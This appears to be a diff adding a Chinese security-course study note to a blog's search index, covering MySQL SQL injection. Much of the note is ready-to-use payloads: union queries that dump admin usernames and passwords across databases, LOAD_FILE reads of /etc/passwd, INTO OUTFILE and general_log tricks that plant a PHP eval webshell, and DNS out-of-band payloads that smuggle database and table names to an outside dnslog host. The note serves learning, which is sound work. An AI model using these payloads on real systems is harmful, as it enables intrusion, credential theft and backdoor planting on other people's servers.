@@ -3221,4 +3221,93 @@ logindata.Password =encodeURI(encrypt.encrypt(numPassword));
         <tag>笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>第57天-SQL注入&amp;高权限判定&amp;跨库查询&amp;文件读写&amp;DNS带外&amp;SecurePriv开关绕过</title>
+    <url>/2026/07/30/%E7%AC%AC57%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E9%AB%98%E6%9D%83%E9%99%90%E5%88%A4%E5%AE%9A-%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99-DNS%E5%B8%A6%E5%A4%96-SecurePriv%E5%BC%80%E5%85%B3%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p><font></font></p>
+<span id="more"></span>
+
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-SQL注入-高权限&amp;跨库&amp;文件读写</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-SQL注入-高权限&amp;文件读写&amp;带外</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<p>案例说明：</p>
+<p>在应用中，数据库用户不同，可操作的数据库和文件读写权限不一，所有在注入过程中可以有更多的利用思路，如直接写入后门，获取数据库下洽谈网站的数据等。</p>
+<h1 id="root用户和普通用户权限差异-mysql"><a href="#root用户和普通用户权限差异-mysql" class="headerlink" title="root用户和普通用户权限差异(mysql)"></a>root用户和普通用户权限差异(mysql)</h1><h2 id="1、文件读写操作权限"><a href="#1、文件读写操作权限" class="headerlink" title="1、文件读写操作权限"></a>1、文件读写操作权限</h2><p>root权限下有文件读写权限，普通用户没有(默认情况，排除管理员授权的情况)</p>
+<blockquote>
+<h3 id="读写操作讲解（LOAD-FILE-和-INTO-OUTFILE）"><a href="#读写操作讲解（LOAD-FILE-和-INTO-OUTFILE）" class="headerlink" title="读写操作讲解（LOAD_FILE () 和 INTO OUTFILE）"></a>读写操作讲解（<font style="background-color:rgba(0, 0, 0, 0);">LOAD_FILE () 和 INTO OUTFILE</font>）</h3><p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">LOAD_FILE () 和 INTO OUTFILE，二者是 MySQL 用于文件读写，SQL 注入高频函数，都依赖 FILE 权限 + secure_file_priv</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">函数：LOAD_FILE (绝对路径) </font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">作用：读取磁盘上文件内容，把文件内容当做字符串返回。  </font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">sql：</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">select load_file(‘&#x2F;etc&#x2F;passwd’);</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">selectload_file(‘C:\windows\system32\drivers\etc\hosts’);</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">INTO OUTFILE 它不是函数，是 select 的子句，不是独立函数！这点面试非常爱考。 作用：把 select 查询结果写入服务器磁盘文件。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">sql：select ‘<?php eval($_POST[cmd]);?>‘ into outfile ‘&#x2F;tmp&#x2F;shell.php’;</font></p>
+</blockquote>
+<h2 id="2、数据库名获取"><a href="#2、数据库名获取" class="headerlink" title="2、数据库名获取"></a>2、数据库名获取</h2><p>同个数据库服务器下<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">默认 root 可查看所有数据库，普通用户能否看见数据库由权限决定，并非只能看到自己管理的库(也就是说管理员让他看到什么就能看到什么)。</font></p>
+<h3 id="课外拓展"><a href="#课外拓展" class="headerlink" title="课外拓展"></a>课外拓展</h3><p><font style="color:#ED740C;">我们通过一个网站拿下数据库，数据库内有其他站点的数据库，能获取到对应的账户密码，但是不知道其他站点对应的url怎么办，有什么思路</font></p>
+<p><font style="color:#81BBF8;background-color:rgba(0, 0, 0, 0);">答：web 配置表 很多网站数据库会保存网站域名、站点 URL、后台地址、base_url、siteurl 字段。搜索表字段：url、domain、site、host、weburl。CMS 一般存于系统配置表，比如config、setting、system_config。  </font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font></p>
+<h1 id="secure-file-priv开关"><a href="#secure-file-priv开关" class="headerlink" title="secure_file_priv开关"></a>secure_file_priv开关</h1><p>show variables like”secure%”</p>
+<p>通过my.ini(windows版本)&#x2F;my.cnf(Linux版本)中设置</p>
+<h2 id="secure-file-priv是MySQL中的系统变量，用于限制文件的读取和写入"><a href="#secure-file-priv是MySQL中的系统变量，用于限制文件的读取和写入" class="headerlink" title="secure_file_priv是MySQL中的系统变量，用于限制文件的读取和写入"></a>secure_file_priv是MySQL中的系统变量，用于限制文件的读取和写入</h2><p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">secure_file_priv &#x3D; NULL</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 彻底禁用读写，任何路径都不能操作，root 也不行。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">secure_file_priv &#x3D; “”</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（空字符串） 没有目录限制，有权限 (FILE 权限) 就可以读写任意目录。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">secure_file_priv &#x3D; “&#x2F;tmp”</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（指定路径）只允许在该指定目录下做文件读写，只能读写 &#x2F;tmp 下面，不能读写别的目录。</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">✅</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">就是你说的这条。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"></font></p>
+<p>绕过条件：存在可执行的SQL地方（后台SQL命令执行，Phpmyadmin应用等）</p>
+<p>从后台的sql命令执行功能点：注入获取得到这个网站的后台账号密码</p>
+<p>从phpmyadmin命令执行功能点：注入获取到数据库的用户名和密码</p>
+<p>存储在mysql数据库下user(用户字段)(password或authentication_string是密码字段)</p>
+<p>show variables like’general_log’;</p>
+<p>setglobal general_log&#x3D;on;</p>
+<p>setglobal general_log_file&#x3D;’D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;php&#x2F;55&#x2F;bypass.php’;</p>
+<p>select’<?php @eval($_POST[x]);?>‘</p>
+<p><a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a>参考</p>
+<h1 id="跨库注入："><a href="#跨库注入：" class="headerlink" title="跨库注入："></a>跨库注入：</h1><p>查数据库名：</p>
+<p>‘ union select SCHEMA_name,2,3 from information_schema.SCHEMATA#</p>
+<p>查表名：</p>
+<p>‘unionselect table_name,2,3from information_schema.tableswhere table_schema&#x3D;’aicms’#</p>
+<p>查列名：</p>
+<p>‘ union select column_name,2,3 from information_schema.columns where table_name&#x3D;’wolive_admin’#</p>
+<p>查数据：</p>
+<p>‘union select username,2,3from aicms.wolive_admin#</p>
+<p>‘union select password,2,3 from aicms.wolive_admin#</p>
+<h2 id="文件操作："><a href="#文件操作：" class="headerlink" title="文件操作："></a>文件操作：</h2><p>关于网站路径获取方法：</p>
+<p>1、遗留文件</p>
+<p>比如phpinfo这类文件，里面会泄露</p>
+<p>2、报错显示</p>
+<p>网站的报错信息有可能显示网站路径</p>
+<p>3、读中间件配置 </p>
+<p>通过读取操作来读中间件默认路径</p>
+<p>4、爆破fuzz路径（纯运气）</p>
+<p>‘union select LOAD_FILE(‘d:\1.txt’),2,3#</p>
+<p>‘union select ‘xxxx’,2,3 into outfile ‘d:\3.txt’#</p>
+<h1 id="带外注入："><a href="#带外注入：" class="headerlink" title="带外注入："></a>带外注入：</h1><p>yakit自带dnslog</p>
+<p>查数据名：</p>
+<p>‘union select load_file(concat(‘\\‘,(select database()),’.yjjoxijrhw.yutu.eu.org\aa’)),2,3#</p>
+<p>concat(‘\\‘,(select database()),’.yjjoxijrhw.yutu.eu.org\aa’)这里是构造了一个unc格式，<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">Windows 专用网络路径格式</font>，用来访问局域网共享文件夹，格式： \服务器主机名\共享名  </p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">load_file本意：读取一个文件内容。传入 UNC 网络共享路径，就是告诉 MySQL：去读取 Windows 网络共享上面的文件</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">。</font></p>
+<h3 id="执行全过程（Windows-系统）（带外注入核心）："><a href="#执行全过程（Windows-系统）（带外注入核心）：" class="headerlink" title="执行全过程（Windows 系统）（带外注入核心）："></a><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">执行全过程（Windows 系统）（带外注入核心）：</font></h3><p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">1、MySQL 拿到字符串 \xxx.dnslog\aa，识别这是一条 UNC 网络共享路径。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">2、MySQL 把这个路径交给 Windows 操作系统。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">3、Windows 第一件事：对域名 xxx.dnslog 做 DNS 解析（向公网 DNS 服务器发起请求）。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">重点：不管这个共享到底存不存在，域名解析这一步一定会执行。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">4、Windows 尝试连接这个网络共享，肯定访问失败。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">5、load_file 读取失败，函数返回NULL给 SQL。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">✅</font><font style="color:rgb(0, 0, 0);background-color:#FBDE28;">核心：虽然读文件失败，但是第 3 步 DNS 请求已经发出，放在子域名里面的数据，已经发送到 DNS‑Log 服务器，实现不带回显的数据外带。</font></p>
+<p>查表名1：</p>
+<p>‘ union select load_file(concat(“\\“,(select table_name from information_schema.tables where table_schema&#x3D;’news_management’ limit 0,1 ),”.yjjoxijrhw.yutu.eu.org\xxx.txt”)),2,3#</p>
+<p>查表名2：</p>
+<p>‘union select load_file(concat(“\\“,(select table_name from information_schema.tableswhere table_schema&#x3D;’news_management’limit0,2),”.yjjoxijrhw.yutu.eu.org\xxx.txt”)),2,3#</p>
+<p>查列名：……同理</p>
+]]></content>
+      <categories>
+        <category>小迪安全课程学习笔记(web攻防)</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
 </search>
